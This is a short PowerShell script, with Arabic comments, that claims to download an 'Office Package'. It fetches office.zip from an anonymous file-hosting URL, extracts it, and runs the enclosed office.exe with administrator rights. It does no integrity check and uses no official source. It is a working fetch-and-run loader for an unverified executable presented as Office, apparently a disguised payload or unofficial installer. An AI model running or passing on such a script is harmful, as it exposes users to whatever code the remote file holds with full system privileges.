#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
Write-Host "Downloading Office Package, Please Wait..." -ForegroundColor Cyan
#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
$Url = "https://file.garden/an5JdIrGtwwEoiH6/office/office.zip"
$TargetDir = "$env:USERPROFILE\Downloads\office"
$ZipDest = "$TargetDir\office.zip"
$ExeDest = "$TargetDir\office.exe"

# إنشاء مجلد الوجهة إذا لم يكن موجوداً
if (-not (Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

# تنزيل الملف المضغوط
irm -Uri $Url -OutFile $ZipDest

#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
if (Test-Path $ZipDest) {
    Write-Host "Downloaded Successfully." -ForegroundColor Green
    Write-Host "Extracting files..." -ForegroundColor Cyan
    
    # فك الضغط واستبدال الملفات إن وجدت
    Expand-Archive -Path $ZipDest -DestinationPath $TargetDir -Force
    
    # التحقق من وجود الملف التنفيذي وتشغيله بصلاحيات المسؤول
    if (Test-Path $ExeDest) {
        Write-Host "Running office.exe..." -ForegroundColor Green
        Start-Process -FilePath $ExeDest -WorkingDirectory $TargetDir -Verb RunAs
    } else {
        Write-Host "office.exe not found after extraction!" -ForegroundColor Red
    }
} else {
    Write-Host "Download Failed! Check connection." -ForegroundColor Red
}
#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
